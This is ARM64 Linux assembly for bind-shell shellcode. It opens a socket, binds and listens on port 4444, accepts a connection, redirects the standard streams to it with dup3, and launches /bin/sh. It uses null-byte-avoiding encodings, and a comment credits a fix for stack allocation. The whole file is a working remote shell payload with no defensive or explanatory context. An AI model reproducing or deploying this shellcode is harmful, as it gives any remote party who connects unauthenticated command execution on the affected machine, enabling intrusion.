// Fix from: github.com/maxcompston (added 4 more bytes for each stack allocation)
.section .text
.global _start
_start:
    // s = socket(2, 1, 0)
    mov  x8, #198
    lsr  x1, x8, #7
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x4, x0

    // bind(s, &sockaddr, 16)
    lsl  x1, x1, #1
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-16]!
    add  x1, sp, x2
    mov  x2, #16
    mov  x8, #200
    svc  #0x1337

    // listen(s, 2)
    mvn  x0, x4
    lsr  x1, x2, #3
    mov  x8, #201
    svc  #0x1337
    mov  x5, x1

    // c = accept(s, 0, 0)
    mvn  x0, x4
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #202
    svc  #0x1337

    // save c
    mvn  x4, x0
    lsl  x1, x5, #1

dup3:
    // dup3(c, 2, 0) -> dup3(c, 1, 0) -> dup3(c, 0, 0)
    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3

     // execve("/bin/sh", 0, 0)
    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48
    str  x3, [sp, #-16]!
    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337
